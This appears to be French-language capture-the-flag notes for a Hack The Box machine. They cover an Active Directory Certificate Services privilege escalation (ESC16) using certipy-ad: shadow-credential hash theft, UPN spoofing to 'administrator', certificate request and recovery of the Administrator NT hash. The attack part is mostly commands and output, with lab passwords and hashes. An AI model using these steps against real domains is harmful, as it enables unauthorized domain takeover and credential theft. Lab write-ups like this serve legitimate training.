### Identifiation du service dans le scan 
```
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
```


### Récupérer les hashs de comptes avec certipyad
```bash
 certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
 certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm
```

### Découvrir l'existance de ADCS
```bash
netexec ldap <ip> -u user -p pass -M adcs
```

### Identification des vuln ADCS sur la cible
```bash
certipy-ad find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable -enabled -stdout
```

## Exploitation des ADCS 
### ESC1 

### ECS16
Cette attaque exploit une mauvaise configuration ou CA (Certificat d'authorité) es configuré globalement à désactivé. `szIOD_NDTS_CA_SECURITY_EXT`
la methode est donc : 
#### 1. mettre à jour le UPN (User Principal Name) d'un user vers l'Adminstrator
```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -userca_svc -upn 'administrator'

<SNIP>

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
 userPrincipalName : administrator
[*] Successfully updated 'ca_svc'
```

#### 2. Il convient ensuite de demander un certificat en tant qu'utilisateur ca_svc. L'UPN de cet utilisateur ayant été mis à jour en « administrateur », le certificat obtenu permettra de s'authentifier en tant qu'administrateur. Notez que le modèle « Utilisateur » (modèle par défaut de l'autorité de certification) est utilisé ici.
```bash
certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.10.11.69' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
<SNIP>
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx
```
#### 3. Cela enregistrera le certificat de l'utilisateur Administrateur dans le fichier administrator.pfx. Avant d'utiliser ce certificat, l'UPN modifié de l'utilisateur ca_svc doit être mis à jour avec la valeur correcte.
```bash
certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'
<SNIP>
[*] Updating user 'ca_svc':
 userPrincipalName : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

#### 4. Enfin, utilisons le certificat administrator.pfx pour obtenir le hachage RC4 de l'utilisateur Administrateur.
```bash
certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.10.11.69
<SNIP>
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb':
aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```
